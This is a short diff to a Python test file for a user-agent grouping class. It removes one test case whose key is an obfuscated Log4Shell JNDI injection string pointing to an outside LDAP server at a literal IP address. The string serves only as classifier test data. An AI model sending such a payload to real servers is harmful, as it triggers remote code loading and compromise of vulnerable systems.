@@ -65,10 +65,6 @@ class TestUserAgentGroups:
         assert UserAgentGroups.get_group(key) == UserAgentGroups.MULTIVERSX.value
         assert UserAgentGroups.find(key) == key
 
-        key = "${jndi${azaz:atkpll:-:}ldap://161.35.184.54:53/useragentgateway.multiversx.com}"
-        assert UserAgentGroups.get_group(key) == UserAgentGroups.MULTIVERSX.value
-        assert UserAgentGroups.find(key) == key
-
     def test_browser_grouping(self):
         key = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
         assert UserAgentGroups.get_group(key) == UserAgentGroups.BROWSER.value
